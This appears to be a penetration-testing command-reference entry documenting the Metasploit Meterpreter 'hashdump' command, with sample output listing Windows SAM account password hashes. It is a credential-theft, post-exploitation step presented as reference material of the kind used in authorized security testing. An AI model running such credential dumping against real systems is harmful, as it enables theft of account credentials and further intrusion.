---
id: 69c96c29-ec3b-45cb-b4bc-e752aff3c647
name: Metasploit Dump the Contents of the SAM Database
type: command
executor: metasploit
data: hashdump
output: 'meterpreter > hashdump

  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

  Bob:1000:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::'
created_at: '2020-07-08T23:17:22.434339+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Dump the Contents of the SAM Database

```metasploit
hashdump
```

## Expected Output

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Bob:1000:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
```
